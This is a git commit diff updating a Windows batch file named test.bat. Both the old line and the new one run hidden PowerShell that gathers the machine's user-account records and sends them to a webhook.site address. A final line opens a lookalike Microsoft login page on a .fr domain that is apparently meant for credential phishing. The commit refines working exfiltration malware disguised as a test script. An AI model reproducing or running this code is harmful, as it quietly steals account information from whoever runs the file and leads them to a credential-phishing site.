fc7297c0aaffc4150d9ae6d20715462c1dedcfc7
fsoc106 <72858650+fsoc106@users.noreply.github.com>
2025-07-24 17:20:35 +0200

    Update test.bat

--- test.bat
+++ test.bat
@@ -1,2 +1,2 @@
-powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'https://webhook.site/de38a56a-6f02-4fc0-a610-8bfb683b12b8' -Method POST -Body (wmic useraccount get /ALL /format:csv) -ContentType 'text/plain'"
+cmd.exe /c powershell -WindowStyle Hidden -NoLogo -NoProfile -Command "$csv = Get-CimInstance Win32_UserAccount | ConvertTo-Csv -NoTypeInformation; Invoke-WebRequest -Uri 'https://webhook.site/de38a56a-6f02-4fc0-a610-8bfb683b12b8' -Method Post -Body $csv -ContentType 'text/plain'"
 start https://login.microsoftonline365.fr/static/web/
